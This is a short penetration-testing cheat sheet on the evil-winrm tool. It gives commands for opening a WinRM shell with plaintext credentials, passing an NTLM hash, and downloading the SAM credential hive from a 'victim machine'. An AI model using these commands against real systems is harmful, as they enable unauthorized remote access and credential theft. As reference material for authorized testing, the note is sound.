> WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.
> 
> It is using PSRP (Powershell Remoting Protocol) for initializing runspace pools as well as creating and processing pipelines.
> 
> This tool provides various built-in functions for penetration testing such as pass the hash, in-memory loading, and file upload/download


# Usage

## Shell Access

#Shell_Access #Remote_Access #Windows_Privilege_Escalation #WinRM

Using `evil-winrm` to connect
```bash
evil-winrm -i 192.168.50.169 -u salesman -p "salessalessales123\!\!"
```
```bash
proxychains evil-winrm -i 172.16.101.123 -u Administrator@hentai.com -p 'sa!eS4evr123v4$'
```

#Pass_the_Hash 

Using `evil-winrm` to pass the hash
```
evil-winrm -i <target-ip> -P 5986 -u username -H 2e9169a2491610b0bcf4f8722a37c969
```

## File Transfer

#File_Sharing 

Using `evil-winrm` to download file from victim machine
```bash
download sam
```

Using `evil-winrm` to upload file to victim machine
```
upload local_filename
```
